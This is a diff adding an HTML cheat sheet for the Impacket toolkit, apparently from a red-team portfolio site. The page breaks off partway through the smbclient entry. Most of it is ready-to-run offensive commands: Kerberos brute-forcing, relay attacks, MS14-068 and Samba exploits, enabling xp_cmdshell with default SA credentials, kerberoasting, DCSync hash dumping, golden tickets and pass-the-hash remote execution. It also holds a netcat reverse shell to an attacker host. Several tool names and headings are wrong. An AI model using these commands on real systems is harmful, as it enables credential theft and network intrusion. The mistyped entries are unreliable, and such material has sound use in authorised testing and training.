@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Impacket Cheat Sheet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Impacket Cheat Sheet | Vault-Tec Terminal</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Impacket Cheat Sheet" />
+<meta name="author" content="RedTeamer403" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="RedTeamer403 Security Portfolio" />
+<meta property="og:description" content="RedTeamer403 Security Portfolio" />
+<link rel="canonical" href="http://localhost:4000/notes/cheat/impacket/" />
+<meta property="og:url" content="http://localhost:4000/notes/cheat/impacket/" />
+<meta property="og:site_name" content="Vault-Tec Terminal" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Impacket Cheat Sheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"RedTeamer403"},"description":"RedTeamer403 Security Portfolio","headline":"Impacket Cheat Sheet","url":"http://localhost:4000/notes/cheat/impacket/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <div id="init-screen" class="init-screen">
+    <div class="init-content">
+      <div class="init-step">Initializing VAULT-TEC OS...</div>
+      <div class="init-step">Loading security protocols...</div>
+      <div class="init-step">Establishing secure connection...</div>
+      <div class="init-step">Connection established.</div>
+      <div class="init-step">SYSTEM READY</div>
+    </div>
+  </div>
+
+  <div id="main-content" class="main-content hidden">
+    <header>
+      <div class="container">
+        <h1>Vault-Tec Terminal</h1>
+        <nav>
+          <a href="/" >ABOUT</a>
+          <a href="/posts" >POSTS</a>
+          <a href="/notes" class="active">NOTES</a>
+          <a href="/tools" >TOOLS</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <div class="search-container">
+        <input type="text" class="search-input" placeholder="Search notes...">
+      </div>
+      <div class="notes-container">
+        <div class="notes-sidebar">
+          <div class="notes-category">
+            <h3>CheatSheets</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cheat/curl/" >CURL</a>
+              <a href="/notes/cheat/DNS/" >DNS</a>
+              <a href="/notes/cheat/file/" >File Transfer</a>
+              <a href="/notes/cheat/hydra/" >Hydra</a>
+              <a href="/notes/cheat/impacket/" class="active">Impacket</a>
+              <a href="/notes/cheat/john/" >JohnTheRipper</a>
+              <a href="/notes/cheat/ncat/" >NCAT</a>
+              <a href="/notes/cheat/nmap/" >NMAP</a>
+              <a href="/notes/cheat/useful/" >Online Resources</a>
+              <a href="/notes/cheat/shell/" >Reverse Shell</a>
+              <a href="/notes/cheat/wordlists/" >Wordlists</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Active Directory</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/ad/enum/" >Domain Enumeration</a>
+              <a href="/notes/ad/attack/" >Attack Vectors</a>
+              <a href="/notes/ad/persist/" >Persistence</a>
+              <a href="/notes/ad/lateral/" >Lateral Movement</a>
+            </div>
+          </div>
+          
+          <div class="notes-category">
+            <h3>Cloud</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cloud/aws/" >AWS</a>
+              <a href="/notes/cloud/azure/" >Azure</a>
+              <a href="/notes/cloud/google/" >Google</a>
+              <a href="/notes/cloud/terra/" >Terraform</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Container</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/container/docker/" >Docker</a>
+              <a href="/notes/container/k8s/" >Kubernetes</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Linux</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/linux/checklist/" >Penetration Testing Checklist</a>
+              <a href="/notes/linux/enum/" >Enumeration</a>
+              <a href="/notes/linux/privesc/" >Privilege Escalation</a>
+              <a href="/notes/linux/post/" >Post Exploitation</a>
+              <a href="/notes/linux/services/" >Services</a>
+              <a href="/notes/linux/tools/" >Tools</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Network</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/network/exfil/" >Data Exfiltration</a>
+              <a href="/notes/network/scan/" >Port Scanning</a>
+              <a href="/notes/network/recon/" >Reconnaissance</a>
+              <a href="/notes/network/pivot/" >Pivoting</a>
+              <a href="/notes/network/services/" >Services</a>
+              <a href="/notes/network/sniff/" >Traffic Analysis</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Tech Stack</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/tech/cms/" >CMS</a>
+              <a href="/notes/tech/db/" >Databases</a>
+              <a href="/notes/tech/devops/" >DevOps</a>
+              <a href="/notes/tech/enterprise/" >Enterprise Apps</a>
+              <a href="/notes/tech/iam/" >IAM</a>
+              <a href="/notes/tech/mon/" >Monitoring</a>
+              <a href="/notes/tech/open/" >Open-Source</a>
+              <a href="/notes/tech/util/" >Utilities</a>
+              <a href="/notes/tech/server/" >Web Servers</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Windows</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/windows/av/" >AV/EDR Evasion</a>
+              <a href="/notes/windows/enum/" >Enumeration</a>
+              <a href="/notes/windows/privesc/" >Privilege Escalation</a>
+              <a href="/notes/windows/post/" >Post Exploitation</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Web Application</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/web/recon/" >Reconnaissance</a>
+              <a href="/notes/web/vulns/" >Common Vulnerabilities</a>
+              <a href="/notes/web/auth/" >Authentication Bypass</a>
+              <a href="/notes/web/api/" >API Testing</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="notes-content">
+          <div id="search-results"></div>
+          <div id="note-content">
+            <h1 id="impacket-cheat-sheet">Impacket Cheat Sheet</h1>
+
+<!-- -------------------------------------Attacks and Exploits-------------------------------------------- -->
+
+<details>
+  <summary>Attacks and Exploits</summary>
+  <p></p>
+
+  <h3 id="impacket-kerbrute">impacket-kerbrute</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Brute-forces user/password combinations against Kerberos.</span>
+impacket-kerbrute <span class="nt">-userfile</span> userlist.txt <span class="nt">-password</span> Passw0rd! domain.com
+</code></pre></div>  </div>
+
+  <h3 id="impacket-karmasmb">impacket-karmaSMB</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Executes SMB relay attack, intercepts and relays authentication attempts.</span>
+impacket-karmaSMB <span class="nt">-h</span> target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-karmatftp">impacket-karmaTFTP</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Performs TFTP relay attack, similar to karmaSMB.py but over TFTP.</span>
+impacket-karmaTFTP <span class="nt">-h</span> target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-goldenpac">impacket-goldenpac</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Exploit script for MS14-068, saves golden ticket, launches PSEXEC session.</span>
+impacket-goldenpac domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-sambapipe">impacket-sambapipe</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Exploits CVE-2017-7494, uploads and executes shared library.</span>
+impacket-sambapipe <span class="nt">-so</span> /path/to/shared/library.so domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-smbrelayx">impacket-smbrelayx</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Exploit script for CVE-2015-0005, uses SMB Relay Attack, gathers session key through NETLOGON.</span>
+impacket-smbrelayx <span class="nt">-h</span> target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-ntlmrelayx">impacket-ntlmrelayx</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Executes NTLM Relay Attacks, sets up servers (SMB, HTTP, WCF, RAW), relays to multiple protocols.</span>
+impacket-ntlmrelayx <span class="nt">-h</span> target
+</code></pre></div>  </div>
+</details>
+
+<!-- -------------------------------------Database Interaction-------------------------------------------- -->
+
+<details>
+  <summary>Database Interaction</summary>
+  <p></p>
+
+  <h3 id="impacket-mssqlclient">impacket-mssqlclient</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Retrieves the MSSQL instances names from the target host.</span>
+impacket-mssqlclient 192.168.1.2
+
+<span class="c"># MSSQL client, supports SQL/Windows Authentications (including hashes), TLR.</span>
+impacket-mssqlclient domain/user:password@target
+impacket-mssqlclient <span class="nt">-windows-auth</span> htb.local/mssql-svc@10.10.x.x
+
+<span class="c"># Connect to MS-SQL Server via default SA creds</span>
+impacket-mssqlclient sa:<span class="s1">'poiuytrewq'</span>@&lt;target&gt;
+
+<span class="c"># Enable XP_CMDSHELL for Remote Code Exection</span>
+<span class="o">&gt;</span> EXECUTE sp_configure <span class="s1">'show advanced options'</span>, 1<span class="p">;</span>
+<span class="o">&gt;</span> RECONFIGURE<span class="p">;</span>
+<span class="o">&gt;</span> EXECUTE sp_configure <span class="s1">'xp_cmdshell'</span>, 1<span class="p">;</span>
+<span class="o">&gt;</span> RECONFIGURE<span class="p">;</span>
+<span class="o">&gt;</span> xp_cmdshell <span class="s1">'&lt;command&gt;'</span>
+</code></pre></div>  </div>
+</details>
+
+<!-- -------------------------------------File System Tools-------------------------------------------- -->
+
+<details>
+  <summary>File System Tools</summary>
+  <p></p>
+
+  <h3 id="impacket-esentutl">impacket-esentutl</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Dumps catalogs, pages, tables of ESE databases (e.g., NTDS.dit).</span>
+impacket-esentutl <span class="nt">-m</span> tables path<span class="se">\t</span>o<span class="se">\d</span>atabase.edb
+</code></pre></div>  </div>
+
+  <h3 id="impacket-ntfs-read">impacket-ntfs-read</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Provides mini-shell for browsing/extracting NTFS volume, including hidden/locked contents.</span>
+impacket-ntfs-read /path/to/ntfs/device
+</code></pre></div>  </div>
+
+  <h3 id="impacketregistry-read">impacketregistry-read</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Parses offline Windows Registry hives, useful for forensic investigations.</span>
+impacketregistry-read /path/to/registry/file
+</code></pre></div>  </div>
+</details>
+
+<!-- -------------------------------------Information Gathering-------------------------------------------- -->
+
+<details>
+  <summary>Information Gathering</summary>
+  <p></p>
+
+  <h3 id="impacket-wmiquery">impacket-wmiquery</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Issues WQL queries, obtains descriptions of WMI objects at target system.</span>
+impacket-wmiquery domain/user:password@target <span class="s2">"select name from win32_account"</span>
+</code></pre></div>  </div>
+
+  <h3 id="impacket-finddelegation">impacket-finddelegation</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Lists all delegation relationships (unconstrained, constrained, resource-based) in Active Directory.</span>
+impacket-finddelegation domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-getadusers">impacket-getadusers</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Gathers domain users and their email addresses, includes last logon/password set info.</span>
+impacket-getadusers domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-get-gpppassword">impacket-get-gpppassword</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Extracts/decrypts Group Policy Preferences passwords, parses GPP XML files offline.</span>
+impacket-get-gpppassword domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-lookupsid">impacket-lookupsid</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Windows SID brute forcer through MS-LSAT MSRPC Interface, finds users/groups.</span>
+impacket-lookupsid domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-netview">impacket-netview</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Gets list of sessions opened at remote hosts, tracks logins/logouts.</span>
+impacket-netview domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-rpcdump">impacket-rpcdump</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Dumps list of RPC endpoints and string bindings, matches with well-known endpoints.</span>
+impacket-rpcdump domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-rpcmaps">impacket-rpcmaps</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Scans for listening DCE/RPC interfaces, binds to MGMT interface or tries known UUIDs.</span>
+impacket-rpcmaps domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-samrdump">impacket-samrdump</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Manipulates Windows services through MS-SCMR MSRPC Interface (start, stop, delete, etc.).</span>
+impacket-services domain/user:password@target list
+</code></pre></div>  </div>
+
+  <h3 id="impacket-mssqlinstance">impacket-mssqlinstance</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Retrieves MSSQL instance names from target host.</span>
+impacket-mssqlinstance domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-rdpcheck">impacket-rdp_check</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Tests account validity on target host using partial MS-RDPBCGR and MS-CREDSSP implementation.</span>
+impacket-rdp_check target username password
+</code></pre></div>  </div>
+
+  <h3 id="impacket-mqttcheck">impacket-mqtt_check</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Simple MQIT example, tests different login options, can be used for brute-forcing.</span>
+impacket-mqt_check target <span class="nt">-u</span> username <span class="nt">-P</span> password
+</code></pre></div>  </div>
+</details>
+
+<!-- -------------------------------------Kerberos Manipulation-------------------------------------------- -->
+
+<details>
+  <summary>Kerberos Manipulation</summary>
+  <p></p>
+
+  <h3 id="impacket-gettgt">impacket-GetTGT</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># GetTGT enables you to request a Ticket Granting Ticket (TGT) and save it as ccache, given a password, hash, or aesKey.</span>
+impacket-GetTGT test.local/user:password
+</code></pre></div>  </div>
+
+  <h3 id="impacket-getst">impacket-GetST</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># GetST is designed to request a Service Ticket (ST) and save it as ccache given a password, hash, aesKey, or TGT in ccache. If an account has constrained delegation (with protocol transition) privileges, you can use the ‘-impersonate’ switch to request the ticket on behalf of another user. </span>
+impacket-GetST test.local/user:password <span class="nt">-impersonate</span> victim_user
+</code></pre></div>  </div>
+
+  <h3 id="impacket-getpac">impacket-GetPac</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># GetPac uses a mix of [MS-SFU]’s S4USelf + User to User Kerberos Authentication to acquire the PAC (Privilege Attribute Certificate) structure of a target user by having normal authenticated user credentials.</span>
+impacket-GetPac test.local/user:password target_user
+</code></pre></div>  </div>
+
+  <h3 id="impacket-getuserspns">impacket-GetUserSPNs</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># GetUserSPNs finds and fetches Service Principal Names (SPNs) associated with normal user accounts. The output is compatible with JtR and HashCat.</span>
+impacket-GetUserSPNs test.local/user:password
+
+<span class="c"># with a password</span>
+impacket-GetUserSPNs <span class="nt">-outputfile</span> kerberoastables.txt <span class="nt">-dc-ip</span> <span class="nv">$KeyDistributionCenter</span> <span class="s1">'DOMAIN/USER:Password'</span>
+
+<span class="c"># with an NT hash</span>
+impacket-GetUserSPNs <span class="nt">-outputfile</span> kerberoastables.txt <span class="nt">-hashes</span> <span class="s1">'LMhash:NThash'</span> <span class="nt">-dc-ip</span> <span class="nv">$KeyDistributionCenter</span> <span class="s1">'DOMAIN/USER'</span>
+
+<span class="c"># Kerberoast without preauthentication</span>
+impacket-GetUserSPNs <span class="nt">-no-preauth</span> <span class="s2">"bobby"</span> <span class="nt">-usersfile</span> <span class="s2">"services.txt"</span> <span class="nt">-dc-host</span> <span class="s2">"DC_IP_or_HOST"</span> <span class="s2">"DOMAIN.LOCAL"</span>/
+</code></pre></div>  </div>
+
+  <h3 id="impacket-getnpusers">impacket-GetNPUsers</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># GetNPUsers lists and gets TGTs for users who have the ‘Do not require Kerberos preauthentication’ property set (UF_DONT_REQUIRE_PREAUTH). The output is compatible with JtR.</span>
+impacket-GetNPUsers test.local/
+
+<span class="c"># users list dynamically queried with an RPC null session</span>
+impacket-GetNPUser <span class="nt">-request</span> <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> ASREProastables.txt <span class="nt">-dc-ip</span> <span class="nv">$KeyDistributionCenter</span> <span class="s1">'DOMAIN/'</span>
+
+<span class="c"># with a users file</span>
+impacket-GetNPUser <span class="nt">-usersfile</span> users.txt <span class="nt">-request</span> <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> ASREProastables.txt <span class="nt">-dc-ip</span> <span class="nv">$KeyDistributionCenter</span> <span class="s1">'DOMAIN/'</span>
+
+<span class="c"># users list dynamically queried with a LDAP authenticated bind (password)</span>
+impacket-GetNPUser <span class="nt">-request</span> <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> ASREProastables.txt <span class="nt">-dc-ip</span> <span class="nv">$KeyDistributionCenter</span> <span class="s1">'DOMAIN/USER:Password'</span>
+
+<span class="c"># users list dynamically queried with a LDAP authenticated bind (NT hash)</span>
+impacket-GetNPUser <span class="nt">-request</span> <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> ASREProastables.txt <span class="nt">-hashes</span> <span class="s1">'LMhash:NThash'</span> <span class="nt">-dc-ip</span> <span class="nv">$KeyDistributionCenter</span> <span class="s1">'DOMAIN/USER'</span>
+</code></pre></div>  </div>
+
+  <h3 id="impacket-rbcd">impacket-rbcd</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># rbcd handles the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer.</span>
+impacket-rbcd domain/user:password
+</code></pre></div>  </div>
+
+  <h3 id="impacket-ticketconverter">impacket-ticketConverter</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Converts kirbi files (mimikatz) to/from ccache files used by Impacket.</span>
+impacket-ticketconverter mimikatz.kirbi
+</code></pre></div>  </div>
+
+  <h3 id="impacket-ticketer">impacket-ticketer</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Creates Golden/Silver tickets from scratch or based on a template.</span>
+impacket-ticketer <span class="nt">-golden</span> <span class="nt">-user</span> victim_user <span class="nt">-domain</span>
+</code></pre></div>  </div>
+</details>
+
+<!-- -------------------------------------Network Utilities-------------------------------------------- -->
+
+<details>
+  <summary>Network Utilities</summary>
+  <p></p>
+
+  <h3 id="impacket-sniff">impacket-sniff</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Simple packet sniffer using pcapy library, listens for packets in transit.</span>
+impacket-sniff <span class="nt">-i</span> eth0
+</code></pre></div>  </div>
+
+  <h3 id="impacket-sniffer">impacket-sniffer</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Simple packet sniffer using raw socket, listens for specified protocols.</span>
+impacket-sniffer <span class="nt">-p</span> tcp <span class="nt">-i</span> eth0
+</code></pre></div>  </div>
+
+  <h3 id="impacket-ping">impacket-ping</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ICMP ping script, checks host status using echo/echo-reply packets.</span>
+impacket-ping target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-ping6">impacket-ping6</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># IPv6 ICMP ping script, checks host status using echo/echo-reply packets.</span>
+impacket-ping6 target
+</code></pre></div>  </div>
+</details>
+
+<!-- -------------------------------------Password and Hash Dumps-------------------------------------------- -->
+
+<details>
+  <summary>Password and Hash Dumps</summary>
+  <p></p>
+
+  <h3 id="impacket-secretsdump">impacket-secretsdump</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Dumps password hashes, LSA secrets, cached credentials, and other info. (Requirements: Domain Administrator Privileges)</span>
+impacket-secretsdump domain/user:password@target
+
+<span class="c"># Remote extraction</span>
+impacket-secretsdump <span class="nt">-just-dc-ntlm</span> domain/user:password@IP
+impacket-secretsdump <span class="nt">-just-dc-ntlm</span> domain/user:@IP <span class="nt">-hashes</span> LMHASH:NTHASH
+
+<span class="c"># Extract NTLM hashes with local files</span>
+impacket-secretsdump <span class="nt">-ntds</span> /root/ntds_cracking/ntds.dit <span class="nt">-system</span> /root/ntds_cracking/systemhive LOCAL
+
+<span class="c"># DCsync via Pass-the-Hash</span>
+impacket-secretsdump &lt;domain&gt;/&lt;domain_admin&gt;@&lt;target_dc&gt; <span class="nt">-hashes</span> &lt;ntlm&gt;:&lt;ntlm&gt; <span class="o">&gt;</span> &lt;outfile.txt&gt;
+
+<span class="c"># DCsync via Kerberos Ticket</span>
+<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/path/to/&lt;krb5cc_ticket&gt;
+impacket-secretsdump &lt;domain&gt;/&lt;domain_admin&gt;@&lt;target_dc&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="o">&gt;</span> &lt;outfile.txt&gt;
+</code></pre></div>  </div>
+
+  <h3 id="impacket-mimikatz">impacket-mimikatz</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Mini-shell controlling remote mimikatz RPC server, extracts passwords, hashes, tickets.</span>
+impacket-mimikatz domain/user:password@target
+impacket-mimikatz <span class="nt">-dc-ip</span> 10.10.2.1 <span class="nt">-target-ip</span> 10.10.2.3 domain/user:password
+</code></pre></div>  </div>
+</details>
+
+<!-- -------------------------------------Remote Command Execution-------------------------------------------- -->
+
+<details>
+  <summary>Remote Command Execution</summary>
+  <p></p>
+
+  <h3 id="impacket-psexec">impacket-psexec</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Acquire a SYSTEM level shell via exploiting write privileges in the default ADMIN$ share.</span>
+
+<span class="c"># PsExec will upload a .exe file to the ADMIN$ share</span>
+<span class="c"># Psexec via Password</span>
+impacket-psxec &lt;domain&gt;/&lt;username&gt;:<span class="s1">'&lt;password'</span>@&lt;target&gt;
+
+<span class="c"># Psexec via Pass-the-Hash</span>
+impacket-psexec &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; <span class="nt">-hashes</span> &lt;ntlm&gt;:&lt;ntlm&gt;
+
+<span class="c"># Psexec via Kerberos Ticket</span>
+<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/path/to/&lt;krb5cc_ticket&gt;
+impacket-psexec &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
+
+<span class="c"># Optional: add a specific command to execute (default: cmd.exe)</span>
+impacket-psxec &lt;domain&gt;/&lt;username&gt;:<span class="s1">'&lt;password&gt;'</span>@&lt;target&gt; <span class="s1">'&lt;command_to_execute&gt;'</span>
+
+<span class="c"># Return Help                    : help</span>
+<span class="c"># Execute Local Commands         : !&lt;local_command&gt;</span>
+<span class="c"># Upload Files to Temp Directory : lput &lt;local_file&gt; Temp</span>
+</code></pre></div>  </div>
+
+  <h3 id="impacket-smbexec">impacket-smbexec</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Alternative to psexec, SmbExec will upload a .exe file to the ADMIN$ share</span>
+impacket-smbexec test.local/john:password123@10.10.10.1
+</code></pre></div>  </div>
+
+  <h3 id="impacket-atexec">impacket-atexec</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Executes commands on the target machine using the Task Scheduler service, returning the output of the performed command.</span>
+impacket-atexec test.local/john:password123@10.10.10.1
+
+<span class="c"># with cleartext credentials</span>
+impacket-atexec <span class="s1">'DOMAIN'</span>/<span class="s1">'USER'</span>:<span class="s1">'PASSWORD'</span>@<span class="s1">'target_ip'</span> <span class="nb">whoami</span>
+
+<span class="c"># pass-the-hash (with an NT hash)</span>
+impacket-atexec <span class="nt">-hashes</span> :<span class="s1">'NThash'</span> <span class="s1">'DOMAIN'</span>/<span class="s1">'USER'</span>:<span class="s1">'PASSWORD'</span>@<span class="s1">'target_ip'</span> <span class="nb">whoami</span>
+
+<span class="c"># kerberos ticket in memory</span>
+impacket-atexec <span class="nt">-no-pass</span> <span class="nt">-k</span> <span class="s1">'DOMAIN'</span>/<span class="s1">'USER'</span>@<span class="s1">'target_ip'</span> <span class="s1">' -c "nc.exe attacker_ip 4545 -e cmd.exe"'</span>
+</code></pre></div>  </div>
+
+  <h3 id="impacket-wmiexec">impacket-wmiexec</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Semi-interactive shell used through Windows Management Instrumentation (WMI). This technique is highly stealthy as it doesn’t necessitate any service/agent installation on the target server and operates as an Administrator.</span>
+impacket-wmiexec test.local/john:password123@10.10.10.1
+</code></pre></div>  </div>
+
+  <h3 id="impacket-dcomexec">impacket-dcomexec</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Semi-interactive shell similiar to wmiexec.py but employs different DCOM endpoints. This technique currently supports MMC20.Application, ShellWindows, and ShellBrowserWindow objects.</span>
+impacket-dcomexec test.local/john:password123@10.10.10.1
+</code></pre></div>  </div>
+
+  <h3 id="impacket-wmipersist">impacket-wmipersist</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Creates/removes WMI Event Consumer/Filter to execute Visual Basic scripts based on WQL filter/timer.</span>
+impacket-wmipersist domain/user:password@target <span class="nb">install</span>
+</code></pre></div>  </div>
+</details>
+
+<!-- -------------------------------------SMB/MSRPC Utilities-------------------------------------------- -->
+
+<details>
+  <summary>SMB/MSRPC Utilities</summary>
+  <p></p>
+
+  <h3 id="impacket-smbserver">impacket-smbserver</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Python implementation of SMB server, sets up shares and user accounts.</span>
+<span class="c"># Host Current Directory</span>
+impacket-smbserver &lt;share_name&gt; <span class="nt">-smb2support</span> <span class="nb">.</span>
+
+<span class="c"># Host Specified Directory</span>
+impacket-smbserver &lt;share_name&gt; <span class="nt">-smb2support</span> &lt;path_to_serve&gt;
+
+<span class="c"># Path to Share</span>
+<span class="c"># \\&lt;ip_addr&gt;\&lt;share_name&gt;\&lt;hosted_files&gt;</span>
+</code></pre></div>  </div>
+
+  <h3 id="impacket-addcomputer">impacket-addcomputer</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Adds computer to domain using LDAP or SAMR (SMB).</span>
+impacket-addcomputer domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-getarch">impacket-getarch</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Gathers OS architecture type by abuse of MSRPC feature.</span>
+impacket-getarch domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-exchanger">impacket-exchanger</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Connects to MS Exchange via RPC over HTTP v2.</span>
+impacket-exchanger domain/user:password@target
+</code></pre></div>  </div>
+
+  <h3 id="impacket-reg">impacket-reg</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Remote registry manipulation tool through MS-RRP MSRPC Interface, similar to REG.EXE.</span>
+impacket-reg domain/user:password@target query <span class="nt">-k</span> HKLM<span class="se">\S</span>oftware
+</code></pre></div>  </div>
+
+  <h3 id="impacket-smbpasswd">impacket-smbpasswd</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Changes expired passwords remotely over SMB (MSRPC-SAMR), alternative to smbpasswd tool.</span>
+impacket-smbpasswd <span class="nt">-r</span> target <span class="nt">-U</span> user%oldpassword <span class="nt">-n</span> newpassword
+</code></pre></div>  </div>
+
+  <h3 id="impacket-smbclient">impacket-smbclient</h3>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># General-purpose SMB client, lists/manipulates shares, files, directories.</span>
+<span class="c"># Smbclient via Password</span>
